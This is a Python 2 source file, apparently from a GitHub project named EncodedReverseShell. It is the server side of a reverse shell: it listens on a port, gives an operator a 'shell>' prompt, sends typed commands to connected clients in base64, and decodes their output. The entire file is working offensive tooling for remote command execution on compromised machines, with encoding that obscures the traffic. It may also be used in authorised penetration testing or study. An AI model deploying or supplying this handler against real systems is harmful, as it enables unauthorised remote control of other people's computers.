#!/usr/bin/python

'''
Author : Helvio Junior (M4v3r1cK)
Date : 2019-01-15
https://github.com/helviojunior/EncodedReverseShell/blob/master/server.py
'''

import socket
import threading
import base64
import sys 
import select
import errno
import exceptions, fcntl, os, time, argparse


parser = argparse.ArgumentParser()
parser.add_argument('port', type=int, help='Local bind port')

args = parser.parse_args()


class ServerThread( threading.Thread ):

  def __init__(self, queue, host, port):
    threading.Thread.__init__(self)
    self.queue = queue
    self.running = True
    self.hostname = host
    self.port = port

  def run(self):
    print "[*] Listening on %s:%d" % (self.hostname, self.port)

    self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    #fcntl.fcntl(self.socket, fcntl.F_SETFL, os.O_NONBLOCK)
    #self.socket.setblocking(0)
    self.socket.bind((self.hostname, self.port))
    self.socket.listen(1)
    #self.socket.settimeout(0.1)
    while self.running:
      try:
        conn, address = self.socket.accept()
        conn.settimeout(None)

        if self.running:
          client_handler = threading.Thread(target=self.queue,args=(conn,address))
          client_handler.start()
      except socket.timeout:
        pass
      except KeyboardInterrupt:
        self.stop()

  def stop(self):
      self.running = False
      try:
        socket.socket(socket.AF_INET, 
                    socket.SOCK_STREAM).connect( (self.hostname, self.port))
      except:
        pass
      self.socket.close()

def print_std(text):
    sys.stdout.write(text)
    sys.stdout.flush()

def send_data(s, text):
    s.send(base64.b64encode(b"%s\n" % text) + b"\n")
    #s.send(b"%s\n" % text)

def recv_timeout(the_socket,timeout=2):
    the_socket.setblocking(0)
    total_data=[];data='';begin=time.time()
    while 1:
        #if you got some data, then break after wait sec
        if total_data and time.time()-begin>timeout:
            break
        #if you got no data at all, wait a little longer
        elif time.time()-begin>timeout*2:
            break
        try:
            data=the_socket.recv(8192)
            if data:
                total_data.append(data)
                begin=time.time()
            else:
                time.sleep(0.1)
        except:
          pass
    return ''.join(total_data)

def handle_client(conn, address):
  global server
  print "[*] Accepted connection from: %s:%d" % (address[0], address[1])
  running = True

  #conn.settimeout(5)

  while running:
    try:
      cmd = raw_input("shell> ")
      
      if cmd == "quit":
        running = False
        conn.close()
        server.stop()

      if cmd == "":
        pass

      try:
        # send something
        send_data(conn, cmd);
        receiving = True
        buffer = ""

        buffer = recv_timeout(conn, 1)
        for line in buffer.splitlines():
          print_std(base64.b64decode(line))
        print ""
        #print base64.b64decode(buffer)

        '''
        while receiving:
          ready = select.select([conn], [], [], 0.5)
          if not ready:
            receiving = False
          else:
            try:
              # Try to receive som data
              buffer += conn.recv(1024)
              print buffer
              print base64.b64decode(buffer)
            except (socket.timeout) as e:
              #print 'Error: %r' % e
              receiving = False
              print "Command timeout."'''
         
          
      except socket.error, e:
        err = e.args[0]
        #print 'Error: %r' % e
        if err == errno.EAGAIN or err == errno.EWOULDBLOCK:
            sleep(1)
            print 'No data available'
        else:
          running =False
          print "Connection closed."
          if conn:
            conn.close()
          server.stop()

    except KeyboardInterrupt:
      running = False
      if conn:
          conn.close()

      raise
    
  conn.close()

def main():
  global server

  if args.port < 0:
    print "Invalid port"
  if args.port > 65355:
    print "Invalid port"

  server = ServerThread(handle_client, "0.0.0.0", args.port)
  server.run()


if __name__ == "__main__":
  main() 

